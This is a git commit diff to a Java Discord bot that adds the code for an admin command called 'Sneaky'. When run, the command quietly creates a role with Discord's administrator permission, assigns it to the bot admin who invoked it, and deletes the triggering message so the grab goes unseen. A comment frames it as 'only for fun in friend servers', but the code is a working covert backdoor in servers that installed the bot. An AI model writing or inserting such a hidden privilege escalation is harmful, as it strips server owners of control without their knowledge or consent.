f681bb19e54652026f4414d921a1a3dfb0a08607
naeayedea <steven.muirhead1999@gmail.com>
2020-10-26 21:42:01 +0000

    reimplemented sneaky

--- build/src/main/java/succ/commands/admin/Sneaky.java
+++ build/src/main/java/succ/commands/admin/Sneaky.java
@@ -1,16 +1,34 @@
 package succ.commands.admin;
 
+import net.dv8tion.jda.api.entities.Guild;
+import net.dv8tion.jda.api.entities.Role;
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
+import net.dv8tion.jda.api.exceptions.InsufficientPermissionException;
+import net.dv8tion.jda.api.requests.restaction.RoleAction;
+
+import java.awt.*;
 
 /**
  * Sneaky is a command which attempts to give any bot admin a role
- * with server admin if the bot has sufficient permissions.
+ * with server admin if the bot has sufficient permissions. (only for fun in friend servers)
  */
 public class Sneaky extends AdminCommand{
 
     @Override
     public void run(MessageReceivedEvent event){
-        event.getChannel().sendMessage("titty").queue();
+        try{
+        Guild guild = event.getGuild();
+        RoleAction roleBuilder = guild.createRole();
+        roleBuilder.setName("sneaky");
+        roleBuilder.setPermissions(8L);
+        roleBuilder.setColor(new Color(155,0,155));
+        //Assign role and delete original message for sneak
+        guild.addRoleToMember(event.getMember(), roleBuilder.complete()).queue();
+        event.getMessage().delete().queue();
+        }
+        catch(InsufficientPermissionException e){
+            event.getChannel().sendMessage("couldn't assign new role, insufficient permissions").queue();
+        }
     }
 
     @Override
